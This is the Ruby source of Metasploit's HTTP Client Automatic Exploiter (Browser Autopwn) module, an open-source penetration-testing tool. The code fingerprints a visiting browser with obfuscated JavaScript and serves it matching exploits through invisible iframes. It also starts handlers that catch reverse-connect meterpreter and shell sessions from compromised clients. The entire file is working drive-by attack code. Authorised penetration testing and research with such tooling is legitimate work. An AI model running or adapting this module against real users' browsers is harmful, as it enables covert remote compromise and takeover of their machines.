##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# ideas:
#	- add a loading page option so the user can specify arbitrary html to
#	  insert all of the evil js and iframes into
#	- caching is busted when different browsers come from the same IP

require 'msf/core'
require 'rex/exploitation/javascriptosdetect'
require 'rex/exploitation/jsobfu'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HTTP Client Automatic Exploiter',
      'Description' => %q{
          This module has three actions.  The first (and the default)
        is 'WebServer' which uses a combination of client-side and
        server-side techniques to fingerprint HTTP clients and then
        automatically exploit them.  Next is 'DefangedDetection' which
        does only the fingerprinting part.  Lastly, 'list' simply
        prints the names of all exploit modules that would be used by
        the WebServer action given the current MATCH and EXCLUDE
        options.

        Also adds a 'list' command which is the same as running with
        ACTION=list.
      },
      'Author'      =>
        [
          # initial concept, integration and extension of Jerome
          # Athias' os_detect.js
          'egypt',
        ],
      'License'     => BSD_LICENSE,
      'Actions'     =>
        [
          [ 'WebServer', {
            'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'
          } ],
          [ 'DefangedDetection', {
            'Description' => 'Only perform detection, send no exploits'
          } ],
          [ 'list', {
            'Description' => 'List the exploit modules that would be started'
          } ]
        ],
      'PassiveActions' =>
        [ 'WebServer', 'DefangedDetection' ],
      'DefaultOptions' => {
          # We know that most of these exploits will crash the browser, so
          # set the default to run migrate right away if possible.
          "InitialAutoRunScript" => "migrate -f",
        },
      'DefaultAction'  => 'WebServer'))

    register_options([
      OptAddress.new('LHOST', [true,
        'The IP address to use for reverse-connect payloads'
      ])
    ], self.class)

    register_advanced_options([
      OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", '']),
      OptBool.new('AutoSystemInfo', [true, "Automatically capture system information on initialization.", true]),
      OptString.new('MATCH', [false,
        'Only attempt to use exploits whose name matches this regex'
      ]),
      OptString.new('EXCLUDE', [false,
        'Only attempt to use exploits whose name DOES NOT match this regex'
      ]),
      OptBool.new('DEBUG', [false,
        'Do not obfuscate the javascript and print various bits of useful info to the browser',
        false
      ]),
      OptPort.new('LPORT_WIN32', [false,
        'The port to use for Windows reverse-connect payloads', 3333
      ]),
      OptString.new('PAYLOAD_WIN32', [false,
        'The payload to use for Windows reverse-connect payloads',
        'windows/meterpreter/reverse_tcp'
      ]),
      OptPort.new('LPORT_LINUX', [false,
        'The port to use for Linux reverse-connect payloads', 4444
      ]),
      OptString.new('PAYLOAD_LINUX', [false,
        'The payload to use for Linux reverse-connect payloads',
        'linux/meterpreter/reverse_tcp'
      ]),
      OptPort.new('LPORT_MACOS', [false,
        'The port to use for Mac reverse-connect payloads', 5555
      ]),
      OptString.new('PAYLOAD_MACOS', [false,
        'The payload to use for Mac reverse-connect payloads',
        'osx/meterpreter/reverse_tcp'
      ]),
      OptPort.new('LPORT_GENERIC', [false,
        'The port to use for generic reverse-connect payloads', 6666
      ]),
      OptString.new('PAYLOAD_GENERIC', [false,
        'The payload to use for generic reverse-connect payloads',
        'generic/shell_reverse_tcp'
      ]),
      OptPort.new('LPORT_JAVA', [false,
        'The port to use for Java reverse-connect payloads', 7777
      ]),
      OptString.new('PAYLOAD_JAVA', [false,
        'The payload to use for Java reverse-connect payloads',
        'java/meterpreter/reverse_tcp'
      ]),
    ], self.class)

    @exploits = Hash.new
    @payloads = Hash.new
    @targetcache = Hash.new
    @current_victim = Hash.new
    @handler_job_ids = []
  end


  ##
  # CommandDispatcher stuff
  ##

  def auxiliary_commands
    {
      'list' => "%red#{self.refname}%clr: List the exploits as filtered by MATCH and EXCLUDE"
    }
  end

  def cmd_list(*args)
    print_status("Listing Browser Autopwn exploits:")
    print_line
    @exploits = {}
    each_autopwn_module do |name, mod|
      @exploits[name] = nil
      print_line name
    end
    print_line
    print_status("Found #{@exploits.length} exploit modules")
  end

  ##
  # Actual exploit stuff
  ##

  def run
    if (action.name == 'list')
      cmd_list
    elsif (action.name == 'DefangedDetection')
      # Do everything we'd normally do for exploits, but don't start any
      # actual exploit modules
      exploit()
    else
      start_exploit_modules()
      if @exploits.length < 1
        print_error("No exploits, check your MATCH and EXCLUDE settings")
        return false
      end
      exploit()
    end
  end


  def setup
    print_status("Setup")

    @init_js = ::Rex::Exploitation::JavascriptOSDetect.new <<-ENDJS

      #{js_base64}

      function make_xhr() {
        var xhr;
        try {
          xhr = new XMLHttpRequest();
        } catch(e) {
          try {
            xhr = new ActiveXObject("Microsoft.XMLHTTP");
          } catch(e) {
            xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
          }
        }
        if (! xhr) {
          throw "failed to create XMLHttpRequest";
        }
        return xhr;
      }

      function report_and_get_exploits(detected_version) {
        var encoded_detection;
        xhr = make_xhr();
        xhr.onreadystatechange = function () {
          if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
            //var ta = document.createElement("textarea");
            //ta.rows = ta.cols = 100;
            //ta.value = xhr.responseText;
            //document.body.appendChild(ta)
            eval(xhr.responseText);
          }
        };

        encoded_detection = new String();
        #{js_debug('navigator.userAgent+"<br><br>"')}
        for (var prop in detected_version) {
          #{js_debug('prop + " " + detected_version[prop] +"<br>"')}
          encoded_detection += detected_version[prop] + ":";
        }
        #{js_debug('"<br>"')}
        encoded_detection = Base64.encode(encoded_detection);
        xhr.open("GET", document.location + "?sessid=" + encoded_detection);
        xhr.send(null);
      }

      function bodyOnLoad() {
        var detected_version = window.os_detect.getVersion();
        //#{js_debug('detected_version')}
        report_and_get_exploits(detected_version);
      } // function bodyOnLoad
    ENDJS

    if (datastore['DEBUG'])
      print_debug("NOTE: Debug Mode; javascript will not be obfuscated")
    else
      pre = Time.now
      print_status("Obfuscating initial javascript #{pre}")
      @init_js.obfuscate
      print_status "Done in #{Time.now - pre} seconds"
    end

    #@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
    @init_html  = %Q|<html > <head > <title > Loading </title>\n|
    @init_html << %Q|<script language="javascript" type="text/javascript">|
    @init_html << %Q|<!-- \n #{@init_js} //-->|
    @init_html << %Q|</script> </head> |
    @init_html << %Q|<body onload="#{@init_js.sym("bodyOnLoad")}()"> |
    @init_html << %Q|<div id="foo"></div> |
    @init_html << %Q|<noscript> \n|
    # Don't use build_iframe here because it will break detection in
    # DefangedDetection mode when the target has js disabled.
    @init_html << %Q|<iframe src="#{self.get_resource}?ns=1"></iframe>|
    @init_html << %Q|</noscript> \n|
    @init_html << %Q|</body> </html> |

    #
    # I'm still not sold that this is the best way to do this, but random
    # LPORTs causes confusion when things break and breakage when firewalls
    # are in the way.  I think the ideal solution is to have
    # self-identifying payloads so we'd only need 1 LPORT for multiple
    # stagers.
    #
    @win_lport  = datastore['LPORT_WIN32']
    @win_payload  = datastore['PAYLOAD_WIN32']
    @lin_lport  = datastore['LPORT_LINUX']
    @lin_payload  = datastore['PAYLOAD_LINUX']
    @osx_lport  = datastore['LPORT_MACOS']
    @osx_payload  = datastore['PAYLOAD_MACOS']
    @gen_lport  = datastore['LPORT_GENERIC']
    @gen_payload  = datastore['PAYLOAD_GENERIC']
    @java_lport = datastore['LPORT_JAVA']
    @java_payload = datastore['PAYLOAD_JAVA']

    minrank = framework.datastore['MinimumRank'] || 'manual'
    if not RankingName.values.include?(minrank)
      print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
      wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
    end
    @minrank = RankingName.invert[minrank]

  end


  def init_exploit(name, mod = nil, targ = 0)
    if mod.nil?
      @exploits[name] = framework.modules.create(name)
    else
      @exploits[name] = mod.new
    end
    @exploits[name] = framework.modules.reload_module(@exploits[name])

    # Reloading failed
    unless @exploits[name]
      @exploits.delete(name)
      return
    end

    apo = @exploits[name].class.autopwn_opts
    if (apo[:rank] < @minrank)
      @exploits.delete(name)
      return false
    end

    case name
    when %r{windows}
      payload = @win_payload
      lport = @win_lport
=begin
    #
    # Some day, we'll support Linux and Mac OS X here..
    #

    when %r{linux}
      payload = @lin_payload
      lport = @lin_lport

    when %r{osx}
      payload = @osx_payload
      lport = @osx_lport
=end

    # We need to check that it's /java_ instead of just java since it would
    # clash with things like mozilla_navigatorjava.  Better would be to
    # check the actual platform of the module here but i'm lazy.
    when %r{/java_}
      payload = @java_payload
      lport = @java_lport
    else
      payload = @gen_payload
      lport = @gen_lport
    end
    @payloads[lport] = payload

    print_status("Starting exploit #{name} with payload #{payload}")
    @exploits[name].datastore['SRVHOST'] = datastore['SRVHOST']
    @exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

    # For testing, set the exploit uri to the name of the exploit so it's
    # easy to tell what is happening from the browser.
    if (datastore['DEBUG'])
      @exploits[name].datastore['URIPATH'] = name
    else
      # randomize it manually since if a saved value exists in the user's
      # configuration, the saved value will get used if we set it to nil
      @exploits[name].datastore['URIPATH'] = Rex::Text.rand_text_alpha(rand(10) + 4)
    end

    @exploits[name].datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    @exploits[name].datastore['MODULE_OWNER'] = self.owner
    @exploits[name].datastore['ParentUUID'] = datastore["ParentUUID"] if datastore["ParentUUID"]
    @exploits[name].datastore['AutopwnUUID'] = self.uuid
    @exploits[name].datastore['LPORT'] = lport
    @exploits[name].datastore['LHOST'] = @lhost
    @exploits[name].datastore['SSL'] = datastore['SSL']
    @exploits[name].datastore['SSLVersion'] = datastore['SSLVersion']
    @exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
    @exploits[name].datastore['DisablePayloadHandler'] = true
    @exploits[name].exploit_simple(
      'LocalInput'     => self.user_input,
      'LocalOutput'    => self.user_output,
      'Target'         => targ,
      'Payload'        => payload,
      'RunAsJob'       => true)

    # It takes a little time for the resources to get set up, so sleep for
    # a bit to make sure the exploit is fully working.  Without this,
    # mod.get_resource doesn't exist when we need it.
    Rex::ThreadSafe.sleep(0.5)

    # Make sure this exploit got set up correctly, return false if it
    # didn't
    if framework.jobs[@exploits[name].job_id.to_s].nil?
      print_error("Failed to start exploit module #{name}")
      @exploits.delete(name)
      return false
    end

    # Since r9714 or so, exploit_simple copies the module instead of
    # operating on it directly when creating a job.  Put the new copy into
    # our list of running exploits so we have access to its state.  This
    # allows us to get the correct URI for each exploit in the same manor
    # as before, using mod.get_resource().
    @exploits[name] = framework.jobs[@exploits[name].job_id.to_s].ctx[0]

    return true
  end


  def start_exploit_modules()
    @lhost = (datastore['LHOST'] || "0.0.0.0")

    @noscript_tests = {}
    @all_tests = {}

    print_line
    print_status("Starting exploit modules on host #{@lhost}...")
    print_status("---")
    print_line
    each_autopwn_module do |name, mod|
      # Start the module.  If that fails for some reason, don't bother
      # adding tests for it.
      next if !(init_exploit(name))

      apo = mod.autopwn_opts.dup
      apo[:name] = name.dup
      apo[:vuln_test] ||= ""

      if apo[:classid]
        # Then this is an IE exploit that uses an ActiveX control,
        # build the appropriate tests for it.
        apo[:vuln_test] = ""
        apo[:ua_name] = HttpClients::IE
        conditions = []
        if apo[:classid].kind_of?(Array)  # then it's many classids
          apo[:classid].each { |clsid|
            if apo[:method].kind_of?(Array)  # then it's many methods
              conditions += apo[:method].map { |m| "testAXO('#{clsid}', '#{m}')" }
            else
              conditions.push "testAXO('#{clsid}', '#{method}')"
            end
          }
        end
        apo[:vuln_test] << "if (#{conditions.join("||")}) {\n"
        apo[:vuln_test] << " is_vuln = true;\n"
        apo[:vuln_test] << "}\n"
      end

      # If the exploit supplies a min/max version, build up a test to
      # check for the proper version.  Note: The version comparison
      # functions come from javascriptosdetect.
      js_d_ver = @init_js.sym("detected_version")
      if apo[:ua_minver] and apo[:ua_maxver]
        ver_test =
            "!#{@init_js.sym("ua_ver_lt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}') && " +
            "!#{@init_js.sym("ua_ver_gt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')"
      elsif apo[:ua_minver]
        ver_test = "!#{@init_js.sym("ua_ver_lt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}')\n"
      elsif apo[:ua_maxver]
        ver_test = "!#{@init_js.sym("ua_ver_gt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')\n"
      else
        ver_test = nil
      end

      # if we built a version check above, add it to the normal test
      if ver_test
        test =  "if (#{ver_test}) { "
        test << (apo[:vuln_test].empty? ? "is_vuln = true;" : apo[:vuln_test])
        test << "} else { is_vuln = false; }\n"
        apo[:vuln_test] = test
      end

      # Now that we've got all of our exploit tests put together,
      # organize them into an all tests (JS and no-JS), organized by rank,
      # and doesnt-require-scripting (no-JS), organized by browser name.
      if apo[:javascript] && apo[:ua_name]
        @all_tests[apo[:rank]] ||= []
        @all_tests[apo[:rank]].push(apo)
      elsif apo[:javascript]
        @all_tests[apo[:rank]] ||= []
        @all_tests[apo[:rank]].push(apo)
      elsif apo[:ua_name]
        @noscript_tests[apo[:ua_name]] ||= []
        @noscript_tests[apo[:ua_name]].push(apo)
        @all_tests[apo[:rank]] ||= []
        @all_tests[apo[:rank]].push(apo)
      else
        @noscript_tests["generic"] ||= []
        @noscript_tests["generic"].push(apo)
        @all_tests[apo[:rank]] ||= []
        @all_tests[apo[:rank]].push(apo)
      end
    end

    # start handlers for each type of payload
    [@win_lport, @lin_lport, @osx_lport, @gen_lport, @java_lport].each do |lport|
      if (lport and @payloads[lport])
        print_status("Starting handler for #{@payloads[lport]} on port #{lport}")
        multihandler = framework.modules.create("exploit/multi/handler")
        multihandler.datastore['MODULE_OWNER'] = self.datastore['MODULE_OWNER']
        multihandler.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
        multihandler.datastore['ParentUUID'] = datastore["ParentUUID"] if datastore["ParentUUID"]
        multihandler.datastore['CAMPAIGN_ID'] = datastore["CAMPAIGN_ID"] if datastore["CAMPAIGN_ID"]
        multihandler.datastore['ParentModule'] = self.fullname
        multihandler.datastore['AutopwnUUID'] = self.uuid
        multihandler.datastore['LPORT'] = lport
        multihandler.datastore['LHOST'] = @lhost
        multihandler.datastore['ExitOnSession'] = false
        multihandler.datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
        multihandler.datastore["ReverseListenerBindAddress"] = datastore["ReverseListenerBindAddress"]
        # XXX: Revisit this when we have meterpreter working on more than just windows
        if (lport == @win_lport or lport == @java_lport)
          multihandler.datastore['AutoRunScript'] = datastore['AutoRunScript']
          multihandler.datastore['AutoSystemInfo'] = datastore['AutoSystemInfo']
          multihandler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript']
        end
        multihandler.exploit_simple(
          'LocalInput'     => self.user_input,
          'LocalOutput'    => self.user_output,
          'Payload'        => @payloads[lport],
          'RunAsJob'       => true)
        @handler_job_ids.push(multihandler.job_id)
      end
    end
    # let the handlers get set up
    Rex::ThreadSafe.sleep(0.5)

    print_line
    print_status("--- Done, found %bld%grn#{@exploits.length}%clr exploit modules")
    print_line

    # Sort the tests by reliability, descending.
    # I don't like doing this directly (wihout a !), but any other sort wasn't sticking - NE
    @all_tests = @all_tests.sort.reverse

    # This matters a lot less for noscript exploits since they basically
    # get thrown into a big pile of iframes that the browser will load
    # semi-concurrently.  Still, might as well.
    @noscript_tests.each { |browser,tests|
      tests.sort! {|a,b| b[:rank] <=> a[:rank]}
    }
  end

  #
  # Main dispatcher method for when we get a request
  #
  def on_request_uri(cli, request)
    print_status("Handling '#{request.uri}'")

    case request.uri
    when self.get_resource
      # This is the first request.  Send the javascript fingerprinter and
      # hope it sends us back some data.  If it doesn't, javascript is
      # disabled on the client and we will have to do a lot more
      # guessing.
      response = create_response()
      response["Expires"] = "0"
      response["Cache-Control"] = "must-revalidate"
      response.body = @init_html
      cli.send_response(response)
    when %r{^#{self.get_resource}.*sessid=}
      # This is the request for the exploit page when javascript is
      # enabled.  Includes the results of the javascript fingerprinting
      # in the "sessid" parameter as a base64 encoded string.
      record_detection(cli, request)
      if (action.name == "DefangedDetection")
        response = create_response()
        response.body = "#{js_debug("'Please wait'")}"
      else
        response = build_script_response(cli, request)
      end
      response["Expires"] = "0"
      response["Cache-Control"] = "must-revalidate"

      cli.send_response(response)
    when %r{^#{self.get_resource}.*ns=1}
      # This is the request for the exploit page when javascript is NOT
      # enabled.  Since scripting is disabled, fall back to useragent
      # detection, which is kind of a bummer since it's so easy for the
      # ua string to lie.  It probably doesn't matter that much because
      # most of our exploits require javascript anyway.
      print_status("Browser has javascript disabled, trying exploits that don't need it")
      record_detection(cli, request)
      if (action.name == "DefangedDetection")
        response = create_response()
        response.body = "Please wait"
      else
        response = build_noscript_response(cli, request)
      end

      response["Expires"] = "0"
      response["Cache-Control"] = "must-revalidate"
      cli.send_response(response)
    else
      print_status("404ing #{request.uri}")
      send_not_found(cli)
      return false
    end
  end

  def html_for_exploit(autopwn_info, client_info)
    html = ""

    html << (autopwn_info[:prefix_html] || "") + "\n"
    html << build_iframe(exploit_resource(autopwn_info[:name])) + "\n"
    html << (autopwn_info[:postfix_html] || "") + "\n"

    if (HttpClients::IE == autopwn_info[:ua_name])
      html = "<!--[if IE]>\n#{html}\n<![endif]-->\n"
    end

    html
  end

  def build_noscript_html(cli, request)
    client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
    body = ""

    sploit_cnt = 0
    @noscript_tests.each { |browser, sploits|
      next if sploits.length == 0

      next unless client_matches_browser(client_info, browser)

      sploits.each do |s|
        body << html_for_exploit( s, client_info )
      end
      sploit_cnt += 1
    }
    print_status("Responding with #{sploit_cnt} non-javascript exploits")
    body
  end

  def build_noscript_response(cli, request)

    response = create_response()
    response['Expires'] = '0'
    response['Cache-Control'] = 'must-revalidate'

    response.body  = "<html > <head > <title > Loading </title> </head> "
    response.body << "<body> "
    response.body << "Please wait "
    response.body << build_noscript_html(cli, request)
    response.body << "</body> </html> "

    return response
  end

  #
  # Build some javascript that attempts to determine which exploits to run
  # for the victim's OS and browser.
  #
  # Returns a raw javascript string to be eval'd on the victim
  #
  def build_script_response(cli, request)
    response = create_response()
    response['Expires'] = '0'
    response['Cache-Control'] = 'must-revalidate'

    # Host info no longer comes from the database! This is strictly a value
    # that came back from javascript OS detection because NAT basically
    # makes it impossible to keep host/client mappings straight.
    client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
    host_info   = client_info[:host]
    #print_status("Client info: #{client_info.inspect}")

    js = "var global_exploit_list = []\n";
    # If we didn't get a client from the database, then the detection
    # is borked or the db is not connected, so fallback to sending
    # some IE-specific stuff with everything.  Do the same if the
    # exploit didn't specify a client.  Otherwise, make sure this is
    # IE before sending code for ActiveX checks.
    if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
      # If we have a class name (e.g.: "DirectAnimation.PathControl"),
      # use the simple and direct "new ActiveXObject()".  If we
      # have a classid instead, first try creating the object
      # with createElement("object").  However, some things
      # don't like being created this way (specifically winzip),
      # so try writing out an object tag as well.  One of these
      # two methods should succeed if the object with the given
      # classid can be created.
      js << <<-ENDJS
        window.testAXO = function(axo_name, method) {
          if (axo_name.substring(0,1) == String.fromCharCode(123)) {
            axobj = document.createElement("object");
            axobj.setAttribute("classid", "clsid:" + axo_name);
            axobj.setAttribute("id", axo_name);
            axobj.setAttribute("style", "visibility: hidden");
            axobj.setAttribute("width", "0px");
            axobj.setAttribute("height", "0px");
            document.body.appendChild(axobj);
            if (typeof(axobj[method]) == 'undefined') {
              var attributes = 'id="' + axo_name + '"';
              attributes += ' classid="clsid:' + axo_name + '"';
              attributes += ' style="visibility: hidden"';
              attributes += ' width="0px" height="0px"';
              document.body.innerHTML += "<object " + attributes + "></object>";
              axobj = document.getElementById(axo_name);
            }
          } else {
            try {
              axobj = new ActiveXObject(axo_name);
            } catch(e) {
              // If we can't build it with an object tag and we can't build it
              // with ActiveXObject, it can't be built.
              return false;
            };
          }
          #{js_debug('axo_name + "." + method + " = " + typeof axobj[method] + "<br/>"')}
          if (typeof(axobj[method]) != 'undefined') {
            return true;
          }
          return false;
        };
      ENDJS
      # End of IE-specific test functions
    end
    # Generic stuff that is needed regardless of what browser was detected.
    js << <<-ENDJS
      var written_iframes = new Array();
      window.write_iframe = function (myframe) {
        var iframe_idx; var mybody;
        for (iframe_idx in written_iframes) {
          if (written_iframes[iframe_idx] == myframe) {
            return;
          }
        }
        written_iframes[written_iframes.length] = myframe;
        str = '';
        str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
        document.body.innerHTML += (str);
      };
      window.next_exploit = function(exploit_idx) {
        #{js_debug("'next_exploit(' + exploit_idx +')<br>'")}
        if (!global_exploit_list[exploit_idx]) {
          #{js_debug("'End<br>'")}
          return;
        }
        #{js_debug("'trying ' + global_exploit_list[exploit_idx].resource + ' of ' + global_exploit_list.length + '<br>'")}
        // Wrap all of the vuln tests in a try-catch block so a
        // single borked test doesn't prevent other exploits
        // from working.
        try {
          var test = global_exploit_list[exploit_idx].test;
          // Debugging
          //tn = document.createTextNode("Test " + exploit_idx +"\\n");
          //br = document.createElement("br");
          //document.body.appendChild(tn);
          //document.body.appendChild(br);
          //tn = document.createTextNode(test);
          //document.body.appendChild(tn);
          if (!test) {
            test = "true";
          }

          if (eval(test)) {
            #{js_debug("'test says it is vuln, writing iframe for ' + global_exploit_list[exploit_idx].resource + '<br>'")}
            window.write_iframe(global_exploit_list[exploit_idx].resource);
            setTimeout("window.next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
          } else {
            #{js_debug("'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'")}
            window.next_exploit(exploit_idx+1);
          }
        } catch(e) {
          #{js_debug("'test threw an exception: ' + e.message + '<br />'")}
          window.next_exploit(exploit_idx+1);
        };
      };
    ENDJS

    sploits_for_this_client = []
    sploit_cnt = 0
    # if we have no client_info, this will add all tests. Otherwise tries
    # to only send tests for exploits that target the client's detected
    # browser.

    @all_tests.each { |rank, sploits|
      sploits.each { |s|
        browser = s[:ua_name] || "generic"
        next unless client_matches_browser(client_info, browser)

        # Send all the generics regardless of what the client is. If the
        # client is nil, then we don't know what it really is, so just err
        # on the side of shells and send everything. Otherwise, send only
        # if the client is using the browser associated with this set of
        # exploits.
        if s[:javascript]
          if (browser == "generic" || client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
            if s[:vuln_test].nil? or s[:vuln_test].empty?
              test = "is_vuln = true"
            else
              # get rid of newlines and escape quotes
              test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
            end
            # shouldn't be any in the resource, but just in case...
            res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")

            # Skip exploits that don't match the client's OS.
            if (host_info and host_info[:os_name] and s[:os_name])
              # Reject exploits whose OS doesn't match that of the
              # victim. Note that host_info comes from javascript OS
              # detection, NOT the database.
              if host_info[:os_name] != "undefined"
                unless s[:os_name].include?(host_info[:os_name])
                  vprint_status("Rejecting #{s[:name]} for non-matching OS")
                  next
                end
              end
            end

            js << "global_exploit_list[global_exploit_list.length] = {\n"
            js << "  'test':'#{test}',\n"
            js << "  'resource':'#{res}'\n"
            js << "};\n"
            sploits_for_this_client.push s[:name]
            sploit_cnt += 1
          end
        else
          if s[:name] =~ %r|/java_|
            res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
            js << "global_exploit_list[global_exploit_list.length] = {\n"
            js << "  'test':'is_vuln = navigator.javaEnabled()',\n"
            js << "  'resource':'#{res}'\n"
            js << "};\n"
          else
            # Some other kind of exploit that we can't generically
            # check for in javascript, throw it on the pile.
            noscript_html << html_for_exploit(s, client_info)
          end
          sploits_for_this_client.push s[:name]
          sploit_cnt += 1
        end
      }
    }

    js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
    js << "window.next_exploit(0);\n"

    js = ::Rex::Exploitation::JSObfu.new(js)
    js.obfuscate unless datastore["DEBUG"]

    response.body = "#{js}"
    print_status("Responding with #{sploit_cnt} exploits")
    sploits_for_this_client.each do |name|
      vprint_status("* #{name}")
    end
    return response
  end

  #
  # Yields each module that exports autopwn_info, filtering on MATCH and EXCLUDE options
  #
  def each_autopwn_module(&block)
    m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
    e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
    framework.exploits.each_module do |name, mod|
      if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
        yield name, mod
      end
    end
  end

  #
  # Returns true if an exploit for +browser+ (one of the +OperatingSystems+
  # constants) should be sent for a particilar client.  +client_info+ should
  # be something returned by +get_client+.
  #
  # If +client_info+ is nil then get_client failed and we have no
  # knowledge of this client, so we can't assume anything about their
  # browser.  If the exploit does not specify a browser target, that
  # means it it is generic and will work anywhere (or at least be
  # able to autodetect).  If the currently connected client's ua_name
  # is nil, then the fingerprinting didn't work for some reason.
  # Lastly, check to see if the client's browser matches the browser
  # targetted by this group of exploits. In all of these cases, we
  # need to send all the exploits in the list.
  #
  # In contrast, if we have all of that info and it doesn't match, we
  # don't need to bother sending it.
  #
  def client_matches_browser(client_info, browser)
    if client_info and browser and client_info[:ua_name]
      if browser != "generic" and  client_info[:ua_name] != browser
        vprint_status("Rejecting exploits for #{browser}")
        return false
      end
    end

    true
  end


  # consider abstracting this out to a method (probably
  # with a different name) of Msf::Auxiliary::Report or
  # Msf::Exploit::Remote::HttpServer
  def record_detection(cli, request)
    os_name = nil
    os_flavor = nil
    os_sp = nil
    os_lang = nil
    arch = nil
    ua_name = nil
    ua_ver = nil

    data_offset = request.uri.index('sessid=')
    #p request['User-Agent']
    if (data_offset.nil? or -1 == data_offset)
      # then we didn't get a report back from our javascript
      # detection; make a best guess effort from information
      # in the user agent string.  The OS detection should be
      # roughly the same as the javascript version on non-IE
      # browsers because it does most everything with
      # navigator.userAgent
      print_status("Recording detection from User-Agent: #{request['User-Agent']}")
      report_user_agent(cli.peerhost, request)
    else
      data_offset += 'sessid='.length
      detected_version = request.uri[data_offset, request.uri.length]
      if (0 < detected_version.length)
        detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
        print_status("JavaScript Report: #{detected_version}")
        (os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')

        if framework.db.active
          note_data = { }
          note_data[:os_name]   = os_name   if os_name != "undefined"
          note_data[:os_flavor] = os_flavor if os_flavor != "undefined"
          note_data[:os_sp]     = os_sp     if os_sp != "undefined"
          note_data[:os_lang]   = os_lang   if os_lang != "undefined"
          note_data[:arch]      = arch      if arch != "undefined"
          print_status("Reporting: #{note_data.inspect}")

          # Reporting stuff isn't really essential since we store all
          # the target information locally.  Make sure any exception
          # raised from the report_* methods doesn't prevent us from
          # sending exploits.  This is really only an issue for
          # connections from localhost where we end up with
          # ActiveRecord::RecordInvalid errors because 127.0.0.1 is
          # blacklisted in the Host validations.
          begin
            report_note({
              :host => cli.peerhost,
              :type => 'javascript_fingerprint',
              :data => note_data,
              :update => :unique_data,
            })
            client_info = {
              :host      => cli.peerhost,
              :ua_string => request['User-Agent'],
              :ua_name   => ua_name,
              :ua_ver    => ua_ver
            }
            report_client(client_info)
          rescue => e
            elog("Reporting failed: #{e.class} : #{e.message}")
          end
        end
      end
    end

    # Always populate the target cache since querying the database is too
    # slow for real-time.
    key = cli.peerhost + request['User-Agent']
    @targetcache ||= {}
    @targetcache[key] ||= {}
    @targetcache[key][:updated_at] = Time.now.to_i

    # Clean the cache
    rmq = []
    @targetcache.each_key do |addr|
      if (Time.now.to_i > @targetcache[addr][:updated_at]+60)
        rmq.push addr
      end
    end
    rmq.each {|addr| @targetcache.delete(addr) }

    # Keep the attributes the same as if it were created in
    # the database.
    @targetcache[key][:updated_at] = Time.now.to_i
    @targetcache[key][:ua_string] = request['User-Agent']
    @targetcache[key][:ua_name] = ua_name
    @targetcache[key][:ua_ver] = ua_ver

    @targetcache[key][:host] = {}
    @targetcache[key][:host][:os_name] = os_name
    @targetcache[key][:host][:os_flavor] = os_flavor
    @targetcache[key][:host][:os_sp] = os_sp
    @targetcache[key][:host][:os_lang] = os_lang

  end

  # Override super#get_client to use a cache since the database is generally
  # too slow to be useful for realtime tasks.  This essentially creates an
  # in-memory database.  The upside is that it works if the database is
  # broken (which seems to be all the time now).
  def get_client(opts)
    host = opts[:host]
    return @targetcache[opts[:host]+opts[:ua_string]]
  end

  def build_iframe(resource)
    ret = ''
    if (action.name == 'DefangedDetection')
      ret << "<p>iframe #{resource}</p>"
    else
      ret << %Q|<iframe src="#{resource}" style="visibility:hidden" height="0" width="0" border="0"></iframe>|
      #ret << %Q|<iframe src="#{resource}" ></iframe>|
    end
    return ret
  end

  def exploit_resource(name)
    if (@exploits[name] && @exploits[name].respond_to?("get_resource"))
      #print_line("Returning #{@exploits[name].get_resource.inspect}, for #{name}")
      return @exploits[name].get_resource
    else
      print_error("Don't have an exploit by that name, returning 404#{name}.html")
      return "404#{name}.html"
    end
  end

  def js_debug(msg)
    if datastore['DEBUG']
      return "document.body.innerHTML += #{msg};"
    end
    return ""
  end

  def cleanup
    print_status("Cleaning up exploits...")
    @exploits.each_pair do |name, mod|
      # if the module died for some reason, we can't kill it
      next unless mod
      framework.jobs[mod.job_id.to_s].stop if framework.jobs[mod.job_id.to_s]
    end
    @handler_job_ids.each do |id|
      framework.jobs[id.to_s].stop if framework.jobs[id.to_s]
    end
    super
  end

end
